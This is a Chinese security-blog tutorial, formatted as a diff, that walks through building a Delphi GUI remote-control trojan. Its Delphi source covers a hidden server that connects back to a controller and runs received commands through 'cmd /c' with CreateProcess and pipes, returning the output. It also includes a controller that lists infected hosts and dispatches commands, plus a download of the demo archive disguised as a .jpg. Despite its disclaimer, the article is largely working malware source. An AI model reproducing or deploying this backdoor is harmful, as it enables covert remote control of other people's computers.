@@ -1,0 +1,208 @@
+*** 本文作者：5ecurity，本文属FreeBuf原创奖励计划，未经许可禁止转载**
+
+## 前言
+
+**通过前面两节（[1](http://www.freebuf.com/articles/web/166492.html)，[2](http://www.freebuf.com/articles/web/166732.html)）的内容相信大家已经对后门原理有了基本的概念，并了解了socket编程和进程通信方面的知识。但有小伙伴反应说这种没有界面的后门对于小白使用起来很不方便，那本节将给大家带来简单界面的远控demo实现，正如大家知道的delphi做界面开发是很方便的，并且有很多好用又简单的控件可以使用，与之前两节相比可视化程度要高很多。那本节就主要带大家体验一下delphi可视化的远控demo实现。**
+
+ ** **PS：本文仅用于技术讨论分享，严禁用于任何非法用途**  
+**
+
+## 一、远控原理
+
+远控与后门的功能类似，其实现在来说远控木马和后门的区别已经不大了，在早年间，后门一般都是偏重隐藏，而木马一般偏重功能全面。现在基本上木马后门的界限已经很模糊了。本节要实现的是一个反弹性的远控，分为被控端（server）和控制端（client）两部分。控制端程序client监听本地端口，被控端server向控制端client发起连接，控制端client接受连接后记录被控端ip地址，并选择要控制的ip发送控制指令。出于原理演示，我们就用最简单的两个socket来实现网络连接和控制，被控端和控制端互相作为连接的发起方和接收方。说起来很绕，下面看图就很清晰了：
+
+![1.png](https://image.3001.net/images/20180329/15223154568402.png!small)
+
+基本原理就是这样了，下面看下功能。
+
+## 二、远控简单功能
+
+仅为演示，功能就简化下命令执行。被控端还是要隐藏窗体，这个隐藏窗体和之前的后门可是不一样的，之前后门是创建的“Console
+Application”，这次我们创建的是“Application”，隐藏的方式也就不一样了，需要在创建窗体后设置窗体显示参数：
+
+    
+    
+    Application.ShowMainForm := False;
+    
+
+这样窗体就不会显示出来了。
+
+## 三、远控实现原理
+
+这回就要分两部分说了，一个是被控端一个是控制端：（一）、被控端server1、设置控制端client连接地址和端口，并连接控制端client；2、被控端server发送本机ip地址给控制端client；3、开启本地socket监听端口等待控制端的指令，收到执行就创建进程执行指令；4、将执行结果作为回显发送给控制端。（二）、控制端client1、开启本地socket监听端口等待被控端连接并接收被控端ip地址；2、当选择了被控端和要发送的控制指令后，连接被控端地址并发送控制指令；3、当被控端执行完指令后会把结果回传回来，接收到回显后在界面显示。
+
+## 四、代码实现
+
+下面看看具体代码：（一）、被控端server与之前开发略有不同，之前是直接上代码，这回我们体验下图形化编程的便捷，拉一个窗体出来，拖几个我们要使用的控件上来：
+
+![2.png](https://image.3001.net/images/20180329/15223154701374.png!small)  
+
+如图，一共5个控件，功能分别是获得本机ip、定时运行、socket客户端（用来连接控制端，并发送信息）、socket服务端（用来开启本地监听端口，接收控制指令）、存储命令执行回显信息有了控件接下来就是编写代码啦1、设置控制端client连接地址和端口，并连接控制端client；
+
+    
+    
+    //定时循环执行连接控制端
+    procedure TForm1.Timer1Timer(Sender: TObject);
+    begin
+      cs1.Active := false;
+      cs1.Address:='127.0.0.1';
+      cs1.Port := 9904;
+      cs1.Active := True;
+    end;
+    
+
+2、被控端server发送本机ip地址给控制端client；
+
+    
+    
+    //发送格式是Myip加本机ip地址，这是一个小技巧，用Myip做标识，控制端接收到后会取后面的作为ip地址
+    procedure TForm1.cs1Connect(Sender: TObject; Socket: TCustomWinSocket);
+    begin
+      timer1.Enabled := False;
+      cs1.Socket.SendText('Myip'+myip1.LocalIP);
+      end;
+    
+
+3、开启本地socket监听端口等待控制端的指令，收到执行就创建进程执行指令；
+
+    
+    
+    //进程通信还是使用最早的匿名管道方式
+    //接收到指令后，加'cmd /c'拼接成完整命令
+    Remotecmd:='cmd /c'+socket.ReceiveText;
+    lsa.nLength := SizeOf(SECURITY_ATTRIBUTES);
+    lsa.lpSecurityDescriptor := nil;
+    lsa.bInheritHandle := True;
+    //创建两个匿名管道用来读写信息
+    if CreatePipe(Readniming,Writeniming,@lsa,0) = false then
+    begin
+    cs1.Socket.SendText('不能创建匿名管道');
+    Freemem(ph);
+    Freemem(fname);
+    Exit;
+    end;
+    //创建进程，执行cmd命令
+    StrPcopy(fname,Remotecmd);
+        if CreateProcess(nil,fname,nil,nil,True,0,nil,nil,si,pi) = False then
+        begin
+        cs1.socket.SendText('不能创建进程');
+        Freemem(ph);
+        Freemem(fname);
+        Exit;
+        end;
+        While(true) do
+        begin
+        if not PeekNamedPipe(Readniming,ph,1,@cchReadBuffer,nil,nil)  Then break;
+        If cchReadbuffer <> 0 then
+        begin
+        if Readfile(Readniming,ph^,4096,cchReadBuffer,nil) = False Then  break;
+        ph[cchReadbuffer]:=Chr(0);
+        Memo1.Lines.Add(ph); //命令执行结果保存在Memo1里
+        end
+        else
+        if (WaitForSingleObject(pi.hProcess,0) = WAIT_OBJECT_0) Then break;
+        Sleep(500);
+        end;
+        ph[cchReadBuffer]:=Chr(0);
+        Memo1.Lines.Add(ph);
+    
+
+4、将执行结果作为回显发送给控制端。
+
+    
+    
+    //发送回显给控制端
+        cs1.socket.Sendtext(memo1.Text);
+    
+
+（二）、控制端client老规矩，拉窗体、开控件……
+
+![3.png](https://image.3001.net/images/20180329/15223154829371.png!small)  
+
+如上所示一共9个控件。功能看界面也应该都可以理解了。我就不多说了。还是老规矩继续“窗体、控件、代码”中的第三步“撸代码”
+
+1、开启本地socket监听端口等待被控端连接并接收被控端ip地址；设置监听端口就不用代码了，直接如下勾选填写内容即可：
+
+![4.png](https://image.3001.net/images/20180329/15223154943788.png!small)  
+
+接收被控端的ip地址代码如下，看到用标识标记的小技巧了么？
+
+    
+    
+    procedure TForm1.ss1ClientRead(Sender: TObject; Socket: TCustomWinSocket);
+     var
+     ip:string;
+    begin
+      ip:=socket.ReceiveText;
+      If Pos('Myip',ip)<>0 then
+      begin
+      showmessage('有主机上线！');
+      ip:=Copy(ip,pos('p',ip)+1,length(ip)-4);
+      listbox1.Items.Add(ip);
+      end
+      else
+      memo1.Lines.Add(ip);
+      end;
+    
+
+没错，就是被控端所有的信息都是通过这个socket发过来的，那么怎么区别是不是ip地址呢，技术通过'Myip'作为标识来区别，如果是ip地址就显示在左边“上线主机”的框框里，如果不是ip那就应该是命令回显信息了，就显示在“命令回显窗口”中。
+
+2、当选择了被控端和要发送的控制指令后，连接被控端地址并发送控制指令；发送控制指令也很简单，首先是发给谁，如果有多个上线主机的话你不说发给谁程序是不会知道的，所以就要先获取被点选的被控端ip，然后在“要执行的命令”框里输入cmd命令，然后点击“执行”就会执行如下代码：
+
+    
+    
+    procedure TForm1.Button1Click(Sender: TObject);
+    var
+    i:integer;
+    ip:string;
+    begin
+       i:=0;
+       While i < listbox1.items.Count do
+       if listbox1.Selected[i] then //获取点选的被控端ip
+       begin
+       ip := Listbox1.Items[i];
+       cs1.Address := Trim(ip);
+       cs1.Port := 9903; //设置被控端的连接端口
+       cs1.Active := True;  //开始连接
+       break;
+       end
+       else
+       i:=i+1;
+       cs1.Socket.SendText(edit1.Text); //发送指令给被控端
+    end;
+    
+
+3、当被控端执行完指令后会把结果回传回来，接收到回显后在界面显示。这部分在上面已经讲过了，就是那个非'Myip'标识的信息都会在这里显示出来。
+
+噹！噹！噹！噹！程序编写完成。delphi的图形化编程在窗体程序开发方面是不是很方便快捷呢。
+
+## 五、使用方法
+
+1、先打开控制端client程序
+
+![5.png](https://image.3001.net/images/20180329/15223155119833.png!small)  
+
+2、打开被控端server程序当然被控端server程序这里是没有界面的，不过在控制端会有主机上线。
+
+![6.png](https://image.3001.net/images/20180329/15223155257904.png!small)  
+
+3、点选被控端并执行命令可以看到回显正常，没什么问题。
+
+![7.png](https://image.3001.net/images/20180329/15223155392045.png!small)  
+
+这个功能比较简单，并且有一个问题，就是使用了两个socket互为服务端和客户端，这样做是有一个缺点的，就是被控机和控制机的ip地址必须可互相直连，简单来说就是或者是同一个内网，或者是都是公网ip。其实是可以用一个socket来进行收发信息的，这样会方便很多，并可以实现被控端在内网也可以连接上进行控制，有机会下次再讲其他更多功能的demo演示。
+
+## 六、代码下载
+
+另存为demo.rar
+
+<http://www.5ecurity.cn/usr/uploads/2018/03/1047841258.jpg>  
+
+## 七、推荐阅读
+
+> DELPHI黑客编程（一）：正向后门原理实现：<http://www.freebuf.com/articles/web/166492.html>
+>
+> DELPHI黑客编程（二）：反弹后门原理实现：<http://www.freebuf.com/articles/web/166732.html>
+
+ *** 本文作者：5ecurity，本文属FreeBuf原创奖励计划，未经许可禁止转载**
+
